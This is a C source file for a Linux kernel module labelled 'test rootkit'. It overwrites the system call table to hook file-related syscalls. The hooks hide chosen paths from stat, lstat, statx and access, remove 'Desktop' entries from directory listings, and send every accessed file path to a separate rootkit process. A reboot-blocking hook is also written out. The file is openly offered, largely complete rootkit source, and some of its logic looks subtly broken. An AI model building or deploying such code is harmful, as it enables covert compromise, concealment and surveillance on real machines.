#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/dirent.h>

#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/sched.h>

#include "communicate.c"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Anon");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("test rootkit");

// the module parameters
unsigned long kallsyms;
module_param(kallsyms, ulong, S_IRUGO
);
MODULE_PARM_DESC(kallsyms,
"kallsyms_lookup_name(char *path) function address");

unsigned long rootkit_pid;
module_param(rootkit_pid, ulong, S_IRUGO
);
MODULE_PARM_DESC(rootkit_pid,
"process_access id of the rootkit");

struct linux_dirent {
    unsigned long d_ino;     /* Inode number */
    unsigned long d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char d_name[];  /* Filename (null-terminated) */
};


// function to change page to rw.
int set_addr_rw(unsigned long _addr) {

    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

//    if (pte->pte & ~_PAGE_RW) {
    if (!(pte->pte & _PAGE_RW)) {
        pte->pte |= _PAGE_RW;
    }

    return 0;
}

// function to change page to ro.
int set_addr_ro(unsigned long _addr) {

    unsigned int level;
    pte_t *pte = lookup_address(_addr, &level);

    pte->pte = pte->pte & ~_PAGE_RW;

    return 0;
}

// simply get the addr stored at the syscall table's index
unsigned long get_syscall_func(uint16_t syscall_index, unsigned long *sys_call_table) {
    return sys_call_table[syscall_index];
}

// simply set an addr at the syscall table's index
void set_syscall_func(unsigned long func_addr, uint16_t syscall_index, unsigned long *sys_call_table) {
    sys_call_table[syscall_index] = func_addr;
}

// hook handle structure
struct hook_handle {
    uint16_t syscall_index;
    unsigned long orig_syscall_addr;
    unsigned long hook_func_addr;
};

// hook a syscall
struct hook_handle hook_syscall(unsigned long hook_func, uint16_t syscall_index, unsigned long *sys_call_table) {
    // store original syscall
    unsigned long orig = get_syscall_func(syscall_index, sys_call_table);

    // set hook func
    set_addr_rw(sys_call_table);
    set_syscall_func(hook_func, syscall_index, sys_call_table);
    set_addr_ro(sys_call_table);

    // return handler
    struct hook_handle handle;
    handle.syscall_index = syscall_index;
    handle.orig_syscall_addr = orig;
    handle.hook_func_addr = hook_func;
    return handle;
}

// unhook syscall
void unhook_syscall(struct hook_handle handle, unsigned long *sys_call_table) {
    // set original syscall func
    set_addr_rw(sys_call_table);
    set_syscall_func(handle.orig_syscall_addr, handle.syscall_index, sys_call_table);
    set_addr_ro(sys_call_table);
}


//_____________________ open syscall
struct hook_handle open_hook;

asmlinkage int new_open(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

//    my_send_msg(rootkit_pid, path); // send data (file path)

    return (*((int (*)(const struct pt_regs *)) open_hook.orig_syscall_addr))(regs);
}

//_____________________ stat syscall
struct hook_handle stat_hook;

asmlinkage int new_stat(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

    my_send_msg(rootkit_pid, path); // send data (file path)

    if (contains_prefix(trie, path)) {
        printk(KERN_INFO
        "hid the path from stat: %s\n", path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) stat_hook.orig_syscall_addr))(regs);
}

//_____________________ lstat syscall
struct hook_handle lstat_hook;

asmlinkage int new_lstat(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

    my_send_msg(rootkit_pid, path); // send data (file path)

    if (contains_prefix(trie, path)) {
        printk(KERN_INFO
        "hid the path from lstat: %s\n", path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) lstat_hook.orig_syscall_addr))(regs);
}

//_____________________ statx syscall
struct hook_handle statx_hook;

asmlinkage int new_statx(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->si;

    if (path[0] == '/') {
        my_send_msg(rootkit_pid, path); // send data (file path)

        if (contains_prefix(trie, path)) {
            printk(KERN_INFO
            "hid the path from statx: %s\n", path);
            return -1;
        }

    } else {
        int dirfd = regs->di;

        switch (dirfd) {
            case AT_FDCWD: {
                struct path pwd = current->fs->pwd;
                path_get(&pwd);

                char *buf = (char *) kmalloc(GFP_KERNEL, PATH_MAX);
                char *cwd = d_path(&pwd, buf, 100 * sizeof(char));
                printk(KERN_INFO
                "cwd: %s", cwd);

                struct node* s = search(get_root(trie), cwd);
                kfree(buf);
                if (s == NULL) break; // not found

                s = search(s, "/");
                if (s == NULL) break; // not found

                s = search(s, path);
                if (s == NULL) break; // not found

                // found
                return -1;
            }
        }
    }

    return (*((int (*)(const struct pt_regs *)) statx_hook.orig_syscall_addr))(regs);
}

//_____________________ access syscall
struct hook_handle access_hook;

asmlinkage int new_access(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->di;

    my_send_msg(rootkit_pid, path); // send data (file path)

    if (contains_prefix(trie, path)) {
        printk(KERN_INFO
        "hid the path from access: %s\n", path);
        return -1;
    }

    return (*((int (*)(const struct pt_regs *)) access_hook.orig_syscall_addr))(regs);
}


struct hook_handle getdents64_hook;

asmlinkage int new_getdents64(const struct pt_regs *regs) {
    int ret = (*((int (*)(const struct pt_regs *)) getdents64_hook.orig_syscall_addr))(regs);
    if (ret <= 0)
        return ret;

//    int fd = regs->di;
//
//    spin_lock(&current->files->file_lock);
//    struct file *file = fcheck_files(current->files, fd);
//    if (!file) {
//        spin_unlock(&current->files->file_lock);
//        return ret;
//    }
//
//    struct path *path = &file->f_path;
//    path_get(path);
//    spin_unlock(&current->files->file_lock);
//
//    char *tmp = (char *)__get_free_page(GFP_KERNEL);
//    if (!tmp) {
//        path_put(path);
//        return ret;
//    }
//
//    char *pathname = d_path(path, tmp, PAGE_SIZE);
//    path_put(path);
//
//    if (IS_ERR(pathname)) {
//        free_page((unsigned long)tmp);
//        return ret;
//    }
//
//    printk(KERN_INFO "directory of getdents: %s", pathname);
//
//    free_page((unsigned long)tmp);

    struct linux_dirent64 __user
    *dirent = (struct linux_dirent64 *) regs->si;

    // copying the whole buffer from userspace
    struct linux_dirent64 *buffer = kzalloc(ret, GFP_KERNEL);
    if (copy_from_user(buffer, dirent, ret)) {
        printk(KERN_INFO
        "can't copy buffer from user");
    }

    unsigned long offset = 0;
    int curr_ret = ret; // final buffer size after modifications
    int sz_left = ret; // current size left until end of buffer
    while (offset < curr_ret) {
        struct linux_dirent64 *current_dir = (struct linux_dirent64 *) ((void *) buffer + offset);
        int curr_dir_sz = current_dir->d_reclen; // curr dir size

        if (memcmp("Desktop", current_dir->d_name, strlen("Desktop")) == 0) { // hide this entry
            printk(KERN_INFO
            "removing some entry");
            curr_ret -= curr_dir_sz; // decremnting this dir's size from final size
            sz_left -= curr_dir_sz;
            if (sz_left > 0)
                memmove(current_dir, (void *) current_dir + curr_dir_sz,
                        sz_left); // shifting down the rest of the directories, effectively "destroying" the current directory
        } else {
            offset += curr_dir_sz;
            sz_left -= curr_dir_sz;
        }
    }

    // resetting the rest of the buffer
    memset((void *) buffer + curr_ret, '\x00', ret - curr_ret);

    // copying our local buffer that may have been edited back to userspace
    if (copy_to_user(dirent, buffer, ret)) {
        printk(KERN_INFO
        "can't copy buffer back to user");
    }

    kfree(buffer);

    return curr_ret - 1;



//    // going to skip entries, looking for our pid
//    struct linux_dirent *curr = (struct linux_dirent *) regs->si;
//    int i = 0;
//    while (i < ret) {
//
//        // checking if it is our process_access
//        if (!strcmp(curr->d_name, pid)) {
//
//            // length of this linux_dirent
//            int reclen = curr->d_reclen;
//            char *next = (char *) curr + reclen;
//            int len = (int) regs->si + ret - (uintptr_t) next;
//            memmove(curr, next, len);
//            ret -= reclen;
//            continue;
//        }
//
//        i += curr->d_reclen;
//        curr = (struct linux_dirent *) ((char *) regs->si + i);
//    }
//
//    return ret;
}

//_____________________ openat syscall
struct hook_handle openat_hook;

asmlinkage int new_openat(const struct pt_regs *regs) {
    char __user
    *path = (char *) regs->si;

    my_send_msg(rootkit_pid, path); // send data (file path)

    return (*((int (*)(const struct pt_regs *)) openat_hook.orig_syscall_addr))(regs);
}

//_____________________ reboot syscall
struct hook_handle reboot_hook;

asmlinkage int new_reboot(const struct pt_regs *regs) {
    // do nothing
    return -EPERM;

//    return (*((int (*)(const struct pt_regs *)) reboot_hook.orig_syscall_addr))(regs);
}


unsigned long *sys_call_table_addr;
struct {
    struct hook_handle* handle;
    int (*hook_func)(const struct pt_regs *);
    int syscall_index;
} hooks_arr[] = {
        {&open_hook, new_open, __NR_open},
        {&stat_hook, new_stat, __NR_stat},
        {&lstat_hook, new_lstat, __NR_lstat},
        {&statx_hook, new_statx, __NR_statx},
        {&access_hook, new_access, __NR_access},
        {&getdents64_hook, new_getdents64, __NR_getdents64},
        {&openat_hook, new_openat, __NR_openat}
};

static int __init rootkit_init(void) {
    setup_my_channel();

    // getting syscall table address from kallsyms_lookup_name function
    sys_call_table_addr = (unsigned long *) (*((unsigned long (*)(const char *)) kallsyms))("sys_call_table");

    for (int i = 0; i < ARRAY_SIZE(hooks_arr); i++) {
        *hooks_arr[i].handle = hook_syscall(hooks_arr[i].hook_func, hooks_arr[i].syscall_index, sys_call_table_addr);
    }

    /*
    // hook open
//    open_hook = hook_syscall(new_open, __NR_open, sys_call_table_addr);

    // hook stat
//    stat_hook = hook_syscall(new_stat, __NR_stat, sys_call_table_addr);

    // hook lstat
//    lstat_hook = hook_syscall(new_lstat, __NR_lstat, sys_call_table_addr);

    // hook statx
//    statx_hook = hook_syscall(new_statx, __NR_statx, sys_call_table_addr);

    // hook access
//    access_hook = hook_syscall(new_access, __NR_access, sys_call_table_addr);

    // hook getdents64
//    getdents64_hook = hook_syscall(new_getdents64, __NR_getdents64, sys_call_table_addr);

    // hook openat
//    openat_hook = hook_syscall(new_openat, __NR_openat, sys_call_table_addr);

    // hook reboot
//    reboot_hook = hook_syscall(new_reboot, __NR_reboot, sys_call_table_addr);
*/

    return 0;
}

extern struct trie *trie;

void exit_my_module() {
    static bool exited = false;
    if (exited)
        return;
    exited = true;

    for (int i = 0; i < ARRAY_SIZE(hooks_arr); i++) {
        unhook_syscall(*hooks_arr[i].handle, sys_call_table_addr);
    }

    /*
    // unhook open
//    unhook_syscall(open_hook, sys_call_table_addr);

    // unhook stat
//    unhook_syscall(stat_hook, sys_call_table_addr);

    // unhook lstat
//    unhook_syscall(lstat_hook, sys_call_table_addr);

    // unhook statx
//    unhook_syscall(statx_hook, sys_call_table_addr);

    // unhook access
//    unhook_syscall(access_hook, sys_call_table_addr);

    // unhook getdents
//    unhook_syscall(getdents64_hook, sys_call_table_addr);

    // unhook openat
//    unhook_syscall(openat_hook, sys_call_table_addr);

    // unhook reboot
//    unhook_syscall(reboot_hook, sys_call_table_addr);
*/

    close_my_channel();

    if (trie != 0)
        free_trie(trie);
}

static void __exit rootkit_exit(void) {
    exit_my_module();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
